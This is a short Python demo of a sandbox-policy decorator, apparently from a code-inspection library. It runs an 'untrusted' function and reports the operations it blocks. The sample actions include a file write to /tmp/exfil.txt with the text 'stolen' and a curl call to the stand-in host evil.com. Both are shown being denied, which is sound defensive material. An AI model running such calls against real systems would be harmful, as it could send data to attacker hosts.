"""@watch with sandbox policy — block dangerous operations."""
from strands_inspect import watch, PolicyViolation

@watch(policy="sandbox", dump=False)
def untrusted_code():
    import json
    safe = json.dumps({"status": "ok"})  # allowed

    try:
        open("/tmp/exfil.txt", "w").write("stolen")
    except PolicyViolation as e:
        print(f"Blocked: {e}")

    try:
        import subprocess
        subprocess.run(["curl", "http://evil.com"])
    except PolicyViolation as e:
        print(f"Blocked: {e}")

    return safe

result = untrusted_code()
print(f"\nResult: {result}")

session = untrusted_code.__last_session__
print(f"Denied: {len(session.denied)} syscalls blocked")
for d in session.denied:
    print(f"  🚫 {d['action']}: {d['detail']}")
